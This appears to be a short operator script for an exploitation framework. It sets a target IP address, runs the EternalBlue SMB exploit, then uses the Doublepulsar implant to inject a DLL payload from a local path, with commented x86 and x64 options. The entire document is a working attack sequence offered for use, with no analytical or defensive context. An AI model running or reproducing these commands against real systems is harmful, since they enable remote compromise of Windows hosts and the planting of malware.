
setg TargetIP 10.170.21.98


setg NetworkTimeout 10
use EternalBlue
# set Target XP
execute

use Doublepulsar
set NetworkTimeout 10
set DllPayload G:\go.dll
set Architecture x86
# set DllPayload G:\go_64.dll
# set Architecture x64
execute